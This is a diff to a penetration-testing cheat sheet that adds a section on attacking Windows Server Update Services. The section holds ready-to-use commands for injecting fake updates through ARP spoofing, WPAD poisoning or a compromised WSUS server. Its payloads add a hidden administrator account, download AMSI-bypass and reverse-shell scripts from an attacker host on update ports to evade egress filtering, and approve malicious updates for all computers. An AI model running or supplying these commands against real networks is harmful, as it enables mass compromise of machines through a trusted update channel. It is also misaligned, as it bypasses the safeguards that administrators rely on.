@@ -1298,6 +1298,30 @@ Get-AdmPwdPassword -ComputerName <MACHINE NAME>
 ```
 
 ## Attacking WSUS
+- Windows update ports are 8530 and 8531, when creating a rev shell use those if the network is tight/airgapped!
+
+### Enumeration
+#### Identify usage of WSUS on hosts
+- Can be executed on host to check if a wsus server is configured
+```
+reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\Au /v UseWUServer
+```
+
+### WSUS module
+- https://learn.microsoft.com/en-us/powershell/module/updateservices/?view=windowsserver2022-ps
+- Module is available on the WSUS server itself
+
+#### Get information about the WSUS server
+```
+Get-WsusServer
+```
+
+#### Get information about the computers which uses WSUS
+```
+Get-WsusComputer
+```
+
+### Injecting fake update - MTM
 - When deployed without SSL encryption, its possible to perform man-in-the-middle attack and inject a fake update
 - Requirements
   - WSUS without SSL encryption
@@ -1316,7 +1340,7 @@ reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\Au /v UseWUServ
 reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
 ```
 
-### Injecting a fake update via straight ARP spoofing
+### Injecting fake update - ARP spoofing
 - https://github.com/pimps/wsuxploit
 - If unable to perform ARP Spoofing due to an arpspoof issue, use bettercap while the wsuxplit.sh is running.
   - https://github.com/evilsocket/bettercap 
@@ -1326,18 +1350,35 @@ reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
 .\wsuxploit.sh <TARGE IP> <WSUS IP> <WSUS PORT> <PATH TO SIGNED BINARY>
 ```
 
-### Injecten a fake update via WPAD injection
+### Injecting fake update - WPAD injection
 #### Check if automatic detection of the proxy is performed
 - If the 5th byte of the result of the query is even, automatic detection of the proxy may be set in Internet Explorer. Then we can use a poisoner like Responder or Inveigh to perform WPAD injection.
 ```
 req query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Connections"
 ```
 
-### Attacking WSUS Server
+### Injecting fake update - Access to WSUS server
 - WSUS server is most likely be interconnected to servers containing sensitive information.
 - After comprimising the WSUS server it might be possible to acces networks you weren't able before.
 - Inject a fake update directory to the WSUS server
   - https://github.com/AlsidOfficial/WSUSpendu 
+
+#### Update - Make new user
+```
+.\Wsuspendu.ps1 -Inject -PayloadFile .\PsExec64.exe -PayloadArgs '-accepteula -s -d cmd.exe /c "net user <USER> <PASSWORD> /add && net localgroup Administrators <USER> /add"' -ComputerName <COMPUTER>
+```
+
+#### Update - Rev shell
+- Windows update ports are 8530 and 8531, when creating a rev shell use those if the network is tight/airgapped!
+```
+.\WSUSpendu.ps1 -Inject -PayloadFile .\PsExec64.exe -PayloadArgs 'powershell iex (New-Object Net.WebClient).DownloadString("http://xx.xx.xx.xx:8530/amsi.txt"); iex (New-Object Net.WebClient).DownloadString("http://xx.xx.xx.xx:8530/Invoke-PowerShellTcp.ps1")'
+```
+
+#### Get unnaproved updates and approve them
+```
+Get-WsusUpdate -Approval Unapproved
+Get-WsusUpdate -Approval Unapproved | Approve-WsusUpdate -Action Install -TargetGroupName "All Computers"
+```
 
 ## S4U2self
 - Gain access to a domain computer if we have its RC4, AES256 or TGT.
